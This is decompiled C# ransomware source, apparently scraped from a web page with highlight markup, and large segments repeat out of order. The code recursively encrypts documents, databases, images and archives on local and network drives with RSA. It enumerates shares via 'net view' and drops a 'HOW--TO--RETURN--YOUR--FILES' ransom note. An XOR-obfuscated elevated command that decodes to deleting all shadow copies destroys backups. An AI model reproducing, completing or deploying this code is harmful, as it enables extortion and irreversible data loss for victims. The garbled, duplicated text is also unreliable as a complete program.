this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfc, 240, 0xe9 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xf5, 0xf3, 0xf7 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xf4, 0xe1, 0xf7 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 160, 0xf2, 0xf5 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfc, 0xf5 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xf5, 0xf3 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe1, 0xf5, 0xf7 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe1, 0xe1, 0xe5 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe9, 0xfd, 0xe2 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xf5, 0xfe, 0xf2 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 240, 0xe3, 0xfb }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe5, 240, 0xe3 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xa6, 0xeb }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe3, 240, 0xe3 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xeb, 0xf8, 0xe1 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe5, 0xf8, 0xf7 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfb, 0xe1, 0xf6 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 240, 0xf8 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xf3, 0xfc, 0xe1 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe1, 0xff, 0xf6 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xf2, 0xf5, 0xe3 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe1, 0xe2, 0xf5 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfb, 0xe1, 0xf4, 0xf6 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xf5, 0xfe, 0xf2, 0xe9 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe9, 0xfd, 0xe2, 0xe9 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe1, 0xe1, 0xe5, 0xe9 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 240, 0xf2, 0xf2, 0xf5, 0xf3 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfc, 0xf5, 0xf3 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe3, 0xe5, 0xf7 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfe, 0xf5, 0xe5 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfe, 0xf5, 0xe2 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfe, 0xf5, 0xf3 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfe, 0xf5, 0xf6 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xf2, 0xe3, 0xa3 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xff, 0xf4, 0xf7 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xff, 0xe3, 0xf7 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfe, 0xe3, 0xf7 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 240, 0xe3, 230 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe2, 0xe3, 0xa3 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe2, 0xe3, 0xf7 }, this.X)); /* *   : .cd.ldf .mdf .max .dbf .epf .1cd .md .db .pdf .ppt .xls .doc .arj .tar .7z .rar .zip .tif .jpg .ai .bmp .png .cdr .psd .jpeg .docx .xlsx .pptx .accdb .mdb .rtf .odt .ods .odb .odg .cr2 .nef .nrf .orf .arw .sr2 .srf */ //    List&lt;string&gt; list = new List&lt;string&gt;(); Process process = new Process { StartInfo = { FileName = "cmd", Arguments = "/C net view", RedirectStandardOutput = true, UseShellExecute = false, CreateNoWindow = true } }; try { bool flag4; process.Start(); string str4 = process.StandardOutput.ReadToEnd(); int startIndex = 0; int index = 0; goto Label_0A8B; Label_0A48: startIndex = str4.IndexOf('\\', startIndex); if (startIndex == -1) { goto Label_0A98; } index = str4.IndexOf(' ', startIndex); list.Add(str4.Substring(startIndex, index - startIndex)); startIndex = index; Label_0A8B: flag4 = true; goto Label_0A48; } catch { } Label_0A98: num5 = 0; while (num5 &lt; list.Count) { Process process2 = new Process { StartInfo = { FileName = "cmd", Arguments = "/C net view " + list[num5], RedirectStandardOutput = true, UseShellExecute = false, CreateNoWindow = true } }; try { process2.Start(); string s = process2.StandardOutput.ReadToEnd(); byte[] bytes = Encoding.GetEncoding(0x4e3).GetBytes(s); char[] separator = new char[] { '\r', '\n' }; string[] strArray = Encoding.GetEncoding("CP866").GetString(bytes).Split(separator); for (int j = 0; j &lt; strArray.Length; j++) { if (strArray[j].IndexOf("") &gt; -1) { this.FullList.Add(list[num5] + @"\" + strArray[j].Substring(0, strArray[j].IndexOf(""))); } } } catch { } num5++; } ///    ...RSA 2048 RSACryptoServiceProvider provider = new RSACryptoServiceProvider(0x800); this.publicKey = provider.ToXmlString(false); //     XML this.privateKey = this.CryptKey(provider.ToXmlString(true)); //      ... } /////        ssda.far private void SaveKey(string f, string k) { string str = this.keyfile.Substring(0, this.keyfile.Length - 4); if (!File.Exists(f + @"\" + this.keyfile)) { try { File.WriteAllText(f + @"\" + this.keyfile, k); } catch { } } else { try { File.WriteAllText(string.Concat(new object[] { f, @"\", str, this.AmountFiles(f), ".", this.kfExt }), k); } catch { } } } /////              private void SaveNotes() { List&lt;string&gt; list = new List&lt;string&gt; { //     Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory), //   Environment.GetFolderPath(Environment.SpecialFolder.Personal) //   }; for (int i = 0; i &lt; list.Count; i++) //    { this.SaveKey(list[i], this.privateKey); //     ssda.far this.AddNote(list[i]); //      } } /////   private void GetDirs(DirectoryInfo pth) { try { DirectoryInfo[] directories = pth.GetDirectories(); foreach (DirectoryInfo info in directories) { this.GetFiles(info); this.GetDirs(info); } } catch { } } /////       private void GetDrives() { try { string[] logicalDrives = Environment.GetLogicalDrives(); for (int i = 0; i &lt; logicalDrives.Length; i++) { DriveInfo info = new DriveInfo(logicalDrives[i]); if ((info.DriveType == DriveType.Fixed) || (info.DriveType == DriveType.Network)) { this.GetDirs(info.RootDirectory); } } } catch { } } ////      ... private void GetFiles(DirectoryInfo folder) { try { string[] files = Directory.GetFiles(folder.FullName, "*.*"); foreach (string str in files) { foreach (string str2 in this.extensions) //    { if ((str.ToLower().IndexOf(str2) &gt; -1) &amp;&amp; (str.ToLower().IndexOf(str2 + ".") == -1)) { string str3 = str; if (str.IndexOf(this.vNF) == -1) { this.CF(str3); ///  ... } } } } } catch { } } } }</span></span></code> / uOWPVyi0rhyvYmRrGNcIQ == &lt;/ Modulus&gt; &lt;Exponent&gt; AQAB &lt;/ Exponent&gt; &lt;/ RSAKeyValue&gt; <code class="cs hljs"><span class="hljs-keyword"><span class="hljs-keyword">namespace</span></span> <span class="hljs-title"><span class="hljs-title">nekema</span></span> { <span class="hljs-keyword"><span class="hljs-keyword">public</span></span> <span class="hljs-keyword"><span class="hljs-keyword">class</span></span> <span class="hljs-title"><span class="hljs-title">Form1</span></span> : <span class="hljs-title"><span class="hljs-title">Form</span></span> { <span class="hljs-keyword"><span class="hljs-keyword">private</span></span> <span class="hljs-keyword"><span class="hljs-keyword">int</span></span> blocksize = <span class="hljs-number"><span class="hljs-number">0xf5</span></span>; <span class="hljs-comment"><span class="hljs-comment">//245  . private IContainer components = null; private List&lt;string&gt; extensions = new List&lt;string&gt;(); //   private List&lt;string&gt; FullList = new List&lt;string&gt;(); //    private string keyCode; //   .  . private string keyfile = ""; //    "ssda.far" private string kfExt = ""; //   "far" private string kfName = ""; //   "ssda" private static readonly int MAX_PATH = 260; //   private string pbK = ""; //        . private string privateKey = ""; //        private string publicKey = ""; //     . private int repeatCount = 3; //    private List&lt;string&gt; SpecFolders = new List&lt;string&gt;(); private string vNF = ""; //   HOW--TO--RETURN--YOUR--FILES.jpg private byte X = 0x91; // //      DEXOR = 145 //////        HOW--TO--RETURN--YOUR--FILES.jpg private void AddNote(string f) { string currentDirectory = Environment.CurrentDirectory; if (f != currentDirectory) { try { if (!File.Exists(f + @"\" + this.vNF)) { Resources.ne5.Save(f + @"\" + this.vNF); } } catch { } } } ////////   -   private void CF(string f1) { byte[] destinationArray = new byte[this.blocksize]; try { byte[] sourceArray = File.ReadAllBytes(f1); if ((sourceArray.Length / (this.repeatCount + 5)) &gt;= this.blocksize) { RSACryptoServiceProvider provider = new RSACryptoServiceProvider(0x800); provider.FromXmlString(this.publicKey); byte[] buffer3 = new byte[sourceArray.Length + (this.repeatCount * 11)]; byte[] buffer4 = new byte[sourceArray.Length - (this.repeatCount * this.blocksize)]; for (int i = 0; i &lt; this.repeatCount; i++) { Array.Copy(sourceArray, this.blocksize * i, destinationArray, 0, this.blocksize); byte[] buffer5 = provider.Encrypt(destinationArray, false); Array.Copy(buffer5, 0, buffer3, i * (this.blocksize + 11), buffer5.Length); } Array.Copy(sourceArray, this.repeatCount * this.blocksize, buffer4, 0, buffer4.Length); Array.Copy(buffer4, 0, buffer3, this.repeatCount * (this.blocksize + 11), buffer4.Length); try { File.WriteAllBytes(f1, buffer3); File.Move(f1, f1 + this.keyCode); } catch { } } } catch { } } //////          -   private string CryptKey(string s) { string str = ""; byte[] array = new byte[s.Length]; byte[] destinationArray = new byte[this.blocksize]; byte[] bytes = new byte[this.blocksize + 11]; double num = Math.Ceiling((double) (((double) s.Length) / ((double) this.blocksize))); if (s.Length &lt; (num * this.blocksize)) { int length = s.Length; for (int i = 0; i &lt; ((num * this.blocksize) - length); i++) { s = s + " "; } } array = Encoding.Default.GetBytes(s); Array.Reverse(array); try { RSACryptoServiceProvider provider = new RSACryptoServiceProvider(0x800); provider.FromXmlString(this.pbK); for (int j = 0; j &lt; num; j++) { Array.Copy(array, j * this.blocksize, destinationArray, 0, this.blocksize); bytes = provider.Encrypt(destinationArray, false); str = str + Encoding.Default.GetString(bytes); } } catch { } return str; } /////     private void DelS() { byte[] a = new byte[] { 0xe7, 0xe2, 0xe2, 240, 0xf5, 0xfc, 0xf8, 0xff, 0xbf, 0xf4, 0xe9, 0xf4 }; byte[] buffer2 = new byte[] { 0xd5, 0xf4, 0xfd, 0xf4, 0xe5, 0xf4, 0xb1, 0xc2, 0xf9, 240, 0xf5, 0xfe, 230, 0xe2, 0xb1, 190, 0xd0, 0xfd, 0xfd, 0xb1, 190, 0xc0, 0xe4, 0xf8, 0xf4, 0xe5 }; Process process = new Process { StartInfo = { FileName = this.DeXOR(a, this.X), Arguments = this.DeXOR(buffer2, this.X), WindowStyle = ProcessWindowStyle.Hidden, CreateNoWindow = true, UseShellExecute = true, Verb = "runas" } }; try { process.Start(); } catch { } } /////          XOR private string DeXOR(byte[] A, int x) { string str = ""; byte[] bytes = new byte[A.Length]; for (int i = 0; i &lt; A.Length; i++) { bytes[i] = (byte) (A[i] ^ x); } return (str = Encoding.Default.GetString(bytes)); } /////    . private void Init() { this.Prep(); //  this.SaveNotes(); //      this.GetDrives(); //   this.NetScan(); //   this.SetDesktopWallpaper(); //        ,    } private void Prep() { int num5; //  a = ssda.far byte[] a = new byte[] { 0xe2, 0xe2, 0xf5, 240, 0xbf, 0xf7, 240, 0xe3 }; //buffer2 = HOW--TO--RETURN--YOUR--FILES.jpg byte[] buffer2 = new byte[] {0xd9, 0xde, 0xc6, 0xbc, 0xbc, 0xc5, 0xde, 0xbc, 0xbc, 0xc3, 0xd4, 0xc5, 0xc4, 0xc3, 0xdf, 0xbc, 0xbc, 200, 0xde, 0xc4, 0xc3, 0xbc, 0xbc, 0xd7, 0xd8, 0xdd, 0xd4, 0xc2, 0xbf, 0xfb, 0xe1, 0xf6}; //buffer3 = &lt;RSAKeyValue &lt;Modulus&gt;+fFYiO9CH9iZwwzlsQ3X+qZ7Uyx290OhZ1WvLt6cmDd5oRsLoHLnoGws1CWFMOGFjtbaROSkTg3W+72/TjzHkuPp2W/RC7FBC4JpgguCi4x4ye4HEwRkQ75tHhig08hRKm1a7wlwYl8zLAzM8AwTPLh770MOzPqF1fJMKZCAtdUgIKdYNAkrP18sRbshkGNjwjMhMLNbKTaYfo3qIS4vtVUQtcw+g9ys3ZFZetKEl0ZMJEp4X7b4HK9vqUohPBYfBszXY6ion5m5tSSfhJK6OX2HPaU6RDcajTeEcmk9it9x73drJleZ1G+tVgL6duLX/uOWPVyi0rhyvYmRrGNcIQ==&lt;/Modulus&gt;&lt;Exponent&gt;AQAB&lt;/Exponent&gt;&lt;/RSAKeyValue&gt; byte[] buffer3 = new byte[] { 0xad, 0xc3, 0xc2, 0xd0, 0xda, 0xf4, 0xe8, 0xc7, 240, 0xfd, 0xe4, 0xf4, 0xaf, 0xad, 220, 0xfe, 0xf5, 0xe4, 0xfd, 0xe4, 0xe2, 0xaf, 0xba, 0xf7, 0xd7, 200, 0xf8, 0xde, 0xa8, 210, 0xd9, 0xa8, 0xf8, 0xcb, 230, 230, 0xeb, 0xfd, 0xe2, 0xc0, 0xa2, 0xc9, 0xba, 0xe0, 0xcb, 0xa6, 0xc4, 0xe8, 0xe9, 0xa3, 0xa8, 0xa1, 0xde, 0xf9, 0xcb, 160, 0xc6, 0xe7, 0xdd, 0xe5, 0xa7, 0xf2, 0xfc, 0xd5,0xf5, 0xa4, 0xfe, 0xc3, 0xe2, 0xdd, 0xfe, 0xd9, 0xdd, 0xff, 0xfe, 0xd6, 230, 0xe2, 160, 210,0xc6, 0xd7, 220, 0xde, 0xd6, 0xd7, 0xfb, 0xe5, 0xf3, 240, 0xc3, 0xde, 0xc2, 250, 0xc5, 0xf6, 0xa2, 0xc6, 0xba, 0xa6, 0xa3, 190, 0xc5, 0xfb, 0xeb, 0xd9, 250, 0xe4, 0xc1, 0xe1, 0xa3, 0xc6,190, 0xc3, 210, 0xa6, 0xd7, 0xd3, 210, 0xa5, 0xdb, 0xe1, 0xf6, 0xf6, 0xe4, 210, 0xf8, 0xa5, 0xe9, 0xa5, 0xe8, 0xf4, 0xa5, 0xd9, 0xd4, 230, 0xc3, 250, 0xc0, 0xa6, 0xa4, 0xe5, 0xd9, 0xf9, 0xf8, 0xf6, 0xa1, 0xa9, 0xf9, 0xc3, 0xda, 0xfc, 160, 240, 0xa6, 230, 0xfd, 230, 200, 0xfd, 0xa9, 0xeb, 0xdd, 0xd0, 0xeb, 220, 0xa9, 0xd0, 230, 0xc5, 0xc1, 0xdd, 0xf9, 0xa6, 0xa6, 0xa1, 220, 0xde, 0xeb, 0xc1, 0xe0, 0xd7, 160, 0xf7, 0xdb, 220, 0xda, 0xcb, 210, 0xd0, 0xe5, 0xf5, 0xc4, 0xf6, 0xd8, 0xda, 0xf5, 200, 0xdf, 0xd0, 250, 0xe3, 0xc1, 160, 0xa9, 0xe2, 0xc3, 0xf3, 0xe2, 0xf9, 250, 0xd6, 0xdf, 0xfb, 230, 0xfb, 220, 0xf9, 220, 0xdd, 0xdf, 0xf3, 0xda, 0xc5, 240, 200, 0xf7, 0xfe, 0xa2, 0xe0, 0xd8, 0xc2, 0xa5, 0xe7, 0xe5, 0xc7, 0xc4, 0xc0, 0xe5, 0xf2, 230, 0xba, 0xf6, 0xa8, 0xe8, 0xe2, 0xa2, 0xcb, 0xd7, 0xcb, 0xf4, 0xe5, 0xda, 0xd4, 0xfd, 0xa1, 0xcb, 220, 0xdb, 0xd4, 0xe1, 0xa5, 0xc9, 0xa6, 0xf3, 0xa5, 0xd9, 0xda, 0xa8, 0xe7, 0xe0, 0xc4, 0xfe, 0xf9, 0xc1, 0xd3, 200, 0xf7, 0xd3, 0xe2, 0xeb, 0xc9, 200, 0xa7, 0xf8, 0xfe, 0xff, 0xa4, 0xfc, 0xa4, 0xe5, 0xc2, 0xc2, 0xf7, 0xf9, 0xdb, 0xda, 0xa7, 0xde, 0xc9, 0xa3, 0xd9, 0xc1, 240, 0xc4, 0xa7, 0xc3, 0xd5, 0xf2, 240, 0xfb, 0xc5, 0xf4, 0xd4, 0xf2, 0xfc, 250, 0xa8, 0xf8, 0xe5, 0xa8, 0xe9, 0xa6, 0xa2, 0xf5, 0xe3, 0xdb, 0xfd, 0xf4, 0xcb, 160, 0xd6, 0xba, 0xe5, 0xc7, 0xf6, 0xdd, 0xa7, 0xf5, 0xe4, 0xdd, 0xc9, 190, 0xe4, 0xde, 0xc6, 0xc1, 0xc7, 0xe8, 0xf8, 0xa1, 0xe3, 0xf9, 0xe8, 0xe7, 200, 0xfc, 0xc3, 0xe3, 0xd6, 0xdf, 0xf2, 0xd8, 0xc0, 0xac, 0xac, 0xad, 190, 220, 0xfe, 0xf5, 0xe4, 0xfd, 0xe4, 0xe2, 0xaf, 0xad, 0xd4, 0xe9, 0xe1, 0xfe, 0xff, 0xf4, 0xff, 0xe5, 0xaf, 0xd0, 0xc0, 0xd0, 0xd3, 0xad, 190, 0xd4, 0xe9, 0xe1, 0xfe, 0xff, 0xf4, 0xff, 0xe5, 0xaf, 0xad, 190, 0xc3, 0xc2, 0xd0, 0xda, 0xf4, 0xe8, 0xc7, 240, 0xfd, 0xe4, 0xf4, 0xaf}; //  Windows Vista   -    . if (Environment.OSVersion.Version.Major &gt; 5) { new Thread(new ThreadStart(this.DelS)).Start(); } //       ... this.pbK = this.DeXOR(buffer3, this.X); string str = this.DeXOR(buffer2, this.X); this.vNF = this.DeXOR(buffer2, this.X); this.keyfile = this.DeXOR(a, this.X); this.kfExt = this.RetFExt(this.keyfile); this.kfName = this.RetFName(this.keyfile); this.keyCode = "."; //      Random random = new Random(); random.Next(0x61, 0x7a); for (int i = 0; i &lt; 1; i++) { this.keyCode = this.keyCode + Convert.ToChar(random.Next(0x61, 0x7a)).ToString(); } string[] textArray1 = new string[] { this.keyCode, (DateTime.Now.Day + 10).ToString(), Convert.ToChar(random.Next(0x61, 0x7a)).ToString(), Convert.ToChar(random.Next(0x61, 0x7a)).ToString(), Convert.ToChar(random.Next(0x61, 0x7a)).ToString(), Convert.ToChar(random.Next(0x61, 0x7a)).ToString(), (DateTime.Now.Month + 10).ToString(), Convert.ToChar(random.Next(0x61, 0x7a)).ToString() }; this.keyCode = string.Concat(textArray1); //      ... //       ... string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.System); folderPath = folderPath.Substring(0, folderPath.ToLower().IndexOf(@"\system")); string str3 = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles); this.SpecFolders.Add(folderPath.ToLower()); this.SpecFolders.Add(str3.ToLower()); this.SpecFolders.Add(this.DeXOR(new byte[] { 0xc3, 0xd4, 210, 200, 210, 0xdd, 0xd4, 0xc3 }, this.X)); this.SpecFolders.Add(this.DeXOR(new byte[] { 0xb5, 0xc3, 0xd4, 210, 200, 210, 0xdd, 0xd4, 0xbf, 0xd3, 0xd8, 0xdf }, this.X)); this.SpecFolders.Add(this.DeXOR(new byte[] { 0xc2, 0xe8, 0xe2, 0xe5, 0xf4, 0xfc, 0xb1, 0xc7, 0xfe, 0xfd, 0xe4, 0xfc, 0xf4, 0xb1, 0xd8, 0xff, 0xf7, 0xfe, 0xe3, 0xfc, 240, 0xe5, 0xf8, 0xfe, 0xff }, this.X)); /*  ... c:\windows c:\program files (x86) RECYCLER $RECYCLE.BIN System Volume Information */ ///    this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xf2, 0xf5 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfd, 0xf5, 0xf7 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfc, 0xf5, 0xf7 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfc, 240, 0xe9 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xf5, 0xf3, 0xf7 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xf4, 0xe1, 0xf7 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 160, 0xf2, 0xf5 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfc, 0xf5 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xf5, 0xf3 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe1, 0xf5, 0xf7 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe1, 0xe1, 0xe5 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe9, 0xfd, 0xe2 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xf5, 0xfe, 0xf2 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 240, 0xe3, 0xfb }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe5, 240, 0xe3 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xa6, 0xeb }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe3, 240, 0xe3 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xeb, 0xf8, 0xe1 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe5, 0xf8, 0xf7 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfb, 0xe1, 0xf6 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 240, 0xf8 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xf3, 0xfc, 0xe1 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe1, 0xff, 0xf6 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xf2, 0xf5, 0xe3 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe1, 0xe2, 0xf5 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfb, 0xe1, 0xf4, 0xf6 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xf5, 0xfe, 0xf2, 0xe9 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe9, 0xfd, 0xe2, 0xe9 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe1, 0xe1, 0xe5, 0xe9 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 240, 0xf2, 0xf2, 0xf5, 0xf3 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfc, 0xf5, 0xf3 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe3, 0xe5, 0xf7 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfe, 0xf5, 0xe5 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfe, 0xf5, 0xe2 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfe, 0xf5, 0xf3 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfe, 0xf5, 0xf6 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xf2, 0xe3, 0xa3 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xff, 0xf4, 0xf7 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xff, 0xe3, 0xf7 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfe, 0xe3, 0xf7 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 240, 0xe3, 230 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe2, 0xe3, 0xa3 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe2, 0xe3, 0xf7 }, this.X)); /* *   : .cd.ldf .mdf .max .dbf .epf .1cd .md .db .pdf .ppt .xls .doc .arj .tar .7z .rar .zip .tif .jpg .ai .bmp .png .cdr .psd .jpeg .docx .xlsx .pptx .accdb .mdb .rtf .odt .ods .odb .odg .cr2 .nef .nrf .orf .arw .sr2 .srf */ //    List&lt;string&gt; list = new List&lt;string&gt;(); Process process = new Process { StartInfo = { FileName = "cmd", Arguments = "/C net view", RedirectStandardOutput = true, UseShellExecute = false, CreateNoWindow = true } }; try { bool flag4; process.Start(); string str4 = process.StandardOutput.ReadToEnd(); int startIndex = 0; int index = 0; goto Label_0A8B; Label_0A48: startIndex = str4.IndexOf('\\', startIndex); if (startIndex == -1) { goto Label_0A98; } index = str4.IndexOf(' ', startIndex); list.Add(str4.Substring(startIndex, index - startIndex)); startIndex = index; Label_0A8B: flag4 = true; goto Label_0A48; } catch { } Label_0A98: num5 = 0; while (num5 &lt; list.Count) { Process process2 = new Process { StartInfo = { FileName = "cmd", Arguments = "/C net view " + list[num5], RedirectStandardOutput = true, UseShellExecute = false, CreateNoWindow = true } }; try { process2.Start(); string s = process2.StandardOutput.ReadToEnd(); byte[] bytes = Encoding.GetEncoding(0x4e3).GetBytes(s); char[] separator = new char[] { '\r', '\n' }; string[] strArray = Encoding.GetEncoding("CP866").GetString(bytes).Split(separator); for (int j = 0; j &lt; strArray.Length; j++) { if (strArray[j].IndexOf("") &gt; -1) { this.FullList.Add(list[num5] + @"\" + strArray[j].Substring(0, strArray[j].IndexOf(""))); } } } catch { } num5++; } ///    ...RSA 2048 RSACryptoServiceProvider provider = new RSACryptoServiceProvider(0x800); this.publicKey = provider.ToXmlString(false); //     XML this.privateKey = this.CryptKey(provider.ToXmlString(true)); //      ... } /////        ssda.far private void SaveKey(string f, string k) { string str = this.keyfile.Substring(0, this.keyfile.Length - 4); if (!File.Exists(f + @"\" + this.keyfile)) { try { File.WriteAllText(f + @"\" + this.keyfile, k); } catch { } } else { try { File.WriteAllText(string.Concat(new object[] { f, @"\", str, this.AmountFiles(f), ".", this.kfExt }), k); } catch { } } } /////              private void SaveNotes() { List&lt;string&gt; list = new List&lt;string&gt; { //     Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory), //   Environment.GetFolderPath(Environment.SpecialFolder.Personal) //   }; for (int i = 0; i &lt; list.Count; i++) //    { this.SaveKey(list[i], this.privateKey); //     ssda.far this.AddNote(list[i]); //      } } /////   private void GetDirs(DirectoryInfo pth) { try { DirectoryInfo[] directories = pth.GetDirectories(); foreach (DirectoryInfo info in directories) { this.GetFiles(info); this.GetDirs(info); } } catch { } } /////       private void GetDrives() { try { string[] logicalDrives = Environment.GetLogicalDrives(); for (int i = 0; i &lt; logicalDrives.Length; i++) { DriveInfo info = new DriveInfo(logicalDrives[i]); if ((info.DriveType == DriveType.Fixed) || (info.DriveType == DriveType.Network)) { this.GetDirs(info.RootDirectory); } } } catch { } } ////      ... private void GetFiles(DirectoryInfo folder) { try { string[] files = Directory.GetFiles(folder.FullName, "*.*"); foreach (string str in files) { foreach (string str2 in this.extensions) //    { if ((str.ToLower().IndexOf(str2) &gt; -1) &amp;&amp; (str.ToLower().IndexOf(str2 + ".") == -1)) { string str3 = str; if (str.IndexOf(this.vNF) == -1) { this.CF(str3); ///  ... } } } } } catch { } } } }</span></span></code> 0xfe, 0xd6, <code class="cs hljs"><span class="hljs-keyword"><span class="hljs-keyword">namespace</span></span> <span class="hljs-title"><span class="hljs-title">nekema</span></span> { <span class="hljs-keyword"><span class="hljs-keyword">public</span></span> <span class="hljs-keyword"><span class="hljs-keyword">class</span></span> <span class="hljs-title"><span class="hljs-title">Form1</span></span> : <span class="hljs-title"><span class="hljs-title">Form</span></span> { <span class="hljs-keyword"><span class="hljs-keyword">private</span></span> <span class="hljs-keyword"><span class="hljs-keyword">int</span></span> blocksize = <span class="hljs-number"><span class="hljs-number">0xf5</span></span>; <span class="hljs-comment"><span class="hljs-comment">//245  . private IContainer components = null; private List&lt;string&gt; extensions = new List&lt;string&gt;(); //   private List&lt;string&gt; FullList = new List&lt;string&gt;(); //    private string keyCode; //   .  . private string keyfile = ""; //    "ssda.far" private string kfExt = ""; //   "far" private string kfName = ""; //   "ssda" private static readonly int MAX_PATH = 260; //   private string pbK = ""; //        . private string privateKey = ""; //        private string publicKey = ""; //     . private int repeatCount = 3; //    private List&lt;string&gt; SpecFolders = new List&lt;string&gt;(); private string vNF = ""; //   HOW--TO--RETURN--YOUR--FILES.jpg private byte X = 0x91; // //      DEXOR = 145 //////        HOW--TO--RETURN--YOUR--FILES.jpg private void AddNote(string f) { string currentDirectory = Environment.CurrentDirectory; if (f != currentDirectory) { try { if (!File.Exists(f + @"\" + this.vNF)) { Resources.ne5.Save(f + @"\" + this.vNF); } } catch { } } } ////////   -   private void CF(string f1) { byte[] destinationArray = new byte[this.blocksize]; try { byte[] sourceArray = File.ReadAllBytes(f1); if ((sourceArray.Length / (this.repeatCount + 5)) &gt;= 